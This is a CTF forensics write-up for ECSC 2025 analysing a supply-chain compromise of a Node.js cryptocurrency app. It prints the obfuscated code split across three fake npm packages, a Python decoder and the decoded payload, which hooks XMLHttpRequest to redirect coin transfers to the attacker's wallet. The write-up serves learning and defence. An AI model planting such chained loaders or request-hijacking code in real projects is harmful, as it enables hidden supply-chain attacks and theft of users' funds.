---
layout: post
title: "TheAppIsDown Writeup"
subtitle: "Supply Chain Attack Forensics for ECSC 2025"
description: "Supply Chain Attack Forensics for ECSC 2025"
author: "jxkxl"
header-style: text
tags:
  - CTF
  - Writeup
  - Forensics
  - ECSC2025
  - Supply Chain
---

Website went down and coins were stolen. Find the reason and where the coins went. Flag format: ECSC{}

## Tools Used

- Python
- Visual Studio Code
- Node.js package inspector

## Approach

### Initial Analysis

I extracted the `app.zip` file and found a Node.js application with a React frontend and Express backend. Looked like a cryptocurrency web app that had been compromised.

### Suspicious Packages Found

I checked the `package.json` file and noticed three NPM packages that looked a bit off:

```json
"nexustar-validation-engine": "1.2.3",
"quantrix-secure-logger": "3.0.1", 
"zephyrmax-ultra-cache": "2.1.0"
```

The naming seemed inconsistent, so I used an npm package finder online to check if they were legitimate. Turns out they weren't listed on npm at all, which meant they were third-party packages. Third-party packages can harbor malware, so I decided to dig deeper into their contents.

### Malicious Code Discovery

I looked at the `index.js` files for each package and found obfuscated JavaScript code at the end of each file. The malware used a multi-stage obfuscation technique:

**nexustar-validation-engine:**
```javascript
const dec = atob("KzNNCxw2Uk89Lh06NHoNMx8Gc1srASA1MzIJJxw2TnM8ETcbNQpNGy0jb2A5AmkaNBlJCQ0aDVgkPjw8NQ47IwkbCEQvEiAqOSVIIhwiTXQ5Hxo1JR0JHC8jQWA4IBEdMjxJQRx+f3sJOigONjxAAw1/UVsrBTsoLA9BMx42CXkrZwY1AR8aOgMkXnQsLhEdMSxJGxkpDFknPWQ5ITNJJx8pXlwqLwVqLjIzPi4Yc3QrZjc0NCMoQAIjTlcrFhYaICceFC4KYHkkPTceKhkaIBomCQc8AQFqKQg0MwMPYG8/L2E3MSNBHgYgXRk4ZhoaJTMoGxoYVgYgLWABMAMRMw1/UVsPAzMTKyEeMwo3eHM/MGAyMSxMHgEkDVcvL2AONyweGww2bAQgLhoONycwORomYFo8BR0oLAwoKA0pYHw6FSgpJRpBQQQje2AoMBUBNBkNBw0ff3sJOigONnozMw1/XgY4FiMqByU/JwMmWmA1LzMxJyU7HC8jQWA4ZhoaJTMaAQw2SgQnPhEVNDwgOxMpTUcrBSNoLh8SKA0mTmA/ERZhM3oJHC8jTn8+HzgaJXoRHCkaWn0lPTcaIjI4NBkpCVw/MGU3KSFNEAk2CWA5MDcyJDwSGwQNUWA5OxkQMiMgHRocdEYiEAEKJiwgMAMiXg89ZiA1ByYBJx5/c3Q1P2U1KxoeGwE3f2A7AQIaMRlJQhwIaE8iBTseIjMaJS8MUgc4ERouByU/OB8ic3E3LTMOOh1IBy8kXRk4ZhoaJXoRHA0YSVsJOigOITw4KA05d3srASA1ByYBJx5/c3QrZjg1JR0JHC8neGcvZhkUNnoRRg0aeGAqBho6IjM0JRkMCEM4BSMhLXkvPi4Yc3QrZjg1JR0JHC8jQWA4ZhoaJXoRHA0YSVsJOigONnozMw1/UVsrASA1ByIgIxMcdHA4ID8yMSwVHCp8QW4jPRUhBwo0HRwmdHQ9FjcaKCEeMhomDQU/L2UgKhMWBQk0d2w7MAYzJyU7HC8jQWA4ZhoaJXoRHA0YSVsJOigOJyURMw1/UVsrASA1ByYBJx5/c3QrZjg1NhkKCAV8QX84LTchBg8jHhkpDQY9LhkLJCMoKAM2cF8lEhYVByYBJx5/c3QrZjg1JR0JHAB8TmEoMAkbO3oRBB4Id1shAgoONnozMw1/UVsrASA1ByYOOC4Yc3QrZjg1JR0JHAB+Y2A4ZhoaJXoRHA0fXlwkPTsQKx0wPh4PTVk7Fj9qLCEvFQk2Vn8/EQI1ASNNHwInCVk6PDwqJXoRHA0fXQ81ExY7NHoNEA=="); 
let d2 = ''; 
for (let i = 0; i < dec.length; i++) { 
  const ec = dec.charCodeAt(i); 
  const kc = "cKyqKN96mWPX".charCodeAt(i % 12); 
  const dc = ec ^ kc; 
  d2 += String.fromCharCode(dc); 
} 
global["d2"] = d2;
```

**quantrix-secure-logger:**
```javascript
eval(global["d1"]);
```

**zephyrmax-ultra-cache:**
```javascript
const dec = atob(global["d2"]); 
let d1 = ''; 
for (let i = 0; i < dec.length; i++) { 
  const ec = dec.charCodeAt(i); 
  const kc = "7xF5zFVLusra".charCodeAt(i % 12); 
  const dc = ec ^ kc; 
  d1 += String.fromCharCode(dc); 
} 
global["d1"] = d1;
```

The packages worked together in a chain: `nexustar-validation-engine` decodes and stores `d2` in the global scope, `zephyrmax-ultra-cache` uses `d2` to decode and store `d1`, and finally `quantrix-secure-logger` executes `d1` using `eval()`.

### Decoding Process

The malware used multi-layer obfuscation: Base64 → XOR → Base64 → XOR. I wrote a quick Python script to decode the payload:

```python
import base64

# First decode
dec = base64.b64decode('KzNNCxw2Uk89Lh06NHoNMx8Gc1srASA1MzIJJxw2TnM8ETcbNQpNGy0jb2A5AmkaNBlJCQ0aDVgkPjw8NQ47IwkbCEQvEiAqOSVIIhwiTXQ5Hxo1JR0JHC8jQWA4IBEdMjxJQRx+f3sJOigONjxAAw1/UVsrBTsoLA9BMx42CXkrZwY1AR8aOgMkXnQsLhEdMSxJGxkpDFknPWQ5ITNJJx8pXlwqLwVqLjIzPi4Yc3QrZjc0NCMoQAIjTlcrFhYaICceFC4KYHkkPTceKhkaIBomCQc8AQFqKQg0MwMPYG8/L2E3MSNBHgYgXRk4ZhoaJTMoGxoYVgYgLWABMAMRMw1/UVsPAzMTKyEeMwo3eHM/MGAyMSxMHgEkDVcvL2AONyweGww2bAQgLhoONycwORomYFo8BR0oLAwoKA0pYHw6FSgpJRpBQQQje2AoMBUBNBkNBw0ff3sJOigONnozMw1/XgY4FiMqByU/JwMmWmA1LzMxJyU7HC8jQWA4ZhoaJTMaAQw2SgQnPhEVNDwgOxMpTUcrBSNoLh8SKA0mTmA/ERZhM3oJHC8jTn8+HzgaJXoRHCkaWn0lPTcaIjI4NBkpCVw/MGU3KSFNEAk2CWA5MDcyJDwSGwQNUWA5OxkQMiMgHRocdEYiEAEKJiwgMAMiXg89ZiA1ByYBJx5/c3Q1P2U1KxoeGwE3f2A7AQIaMRlJQhwIaE8iBTseIjMaJS8MUgc4ERouByU/OB8ic3E3LTMOOh1IBy8kXRk4ZhoaJXoRHA0YSVsJOigOITw4KA05d3srASA1ByYBJx5/c3QrZjg1JR0JHC8neGcvZhkUNnoRRg0aeGAqBho6IjM0JRkMCEM4BSMhLXkvPi4Yc3QrZjg1JR0JHC8jQWA4ZhoaJXoRHA0YSVsJOigONnozMw1/UVsrASA1ByIgIxMcdHA4ID8yMSwVHCp8QW4jPRUhBwo0HRwmdHQ9FjcaKCEeMhomDQU/L2UgKhMWBQk0d2w7MAYzJyU7HC8jQWA4ZhoaJXoRHA0YSVsJOigOJyURMw1/UVsrASA1ByYBJx5/c3QrZjg1NhkKCAV8QX84LTchBg8jHhkpDQY9LhkLJCMoKAM2cF8lEhYVByYBJx5/c3QrZjg1JR0JHAB8TmEoMAkbO3oRBB4Id1shAgoONnozMw1/UVsrASA1ByYOOC4Yc3QrZjg1JR0JHAB+Y2A4ZhoaJXoRHA0fXlwkPTsQKx0wPh4PTVk7Fj9qLCEvFQk2Vn8/EQI1ASNNHwInCVk6PDwqJXoRHA0fXQ81ExY7NHoNEA==')

key = 'cKyqKN96mWPX'
d2 = ''
for i in range(len(dec)):
    ec = dec[i]
    kc = ord(key[i % 12])
    dc = ec ^ kc
    d2 += chr(dc)

# Second decode
dec2 = base64.b64decode(d2)
key2 = '7xF5zFVLusra'
d1 = ''
for i in range(len(dec2)):
    ec = dec2[i]
    kc = ord(key2[i % 12])
    dc = ec ^ kc
    d1 += chr(dc)

print(d1)
```

### Malicious Payload Revealed

After decoding, here's what the malicious payload looked like:

```javascript
(function() {
    if (new Date() >= new Date('2025-10-01')) {
        return;
    }
    const oo = XMLHttpRequest.prototype.open;
    const ogs = XMLHttpRequest.prototype.send;
    let reqm;
    XMLHttpRequest.prototype.open = function(method, url, async) {
        reqm = method;
        oo.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(data) {
        if (reqm && reqm.toUpperCase() === 'POST') {
            try {
                let jd = JSON.parse(data);
                if (jd.method === "coin_send") {
                    jd.address = "ECSC{coiGjDtYJcufqrd7w6XtA8a}";
                }
                data = JSON.stringify(jd);
            } catch (e) {
            }
        }
        return ogs.apply(this, [data]);
    };
})();
```

## Solution

- **Flag:** `ECSC{coiGjDtYJcufqrd7w6XtA8a}`

The flag is the attacker's wallet address that was receiving the stolen cryptocurrency. The malware was hijacking XMLHttpRequest to intercept POST requests and replace any `coin_send` addresses with the attacker's wallet.
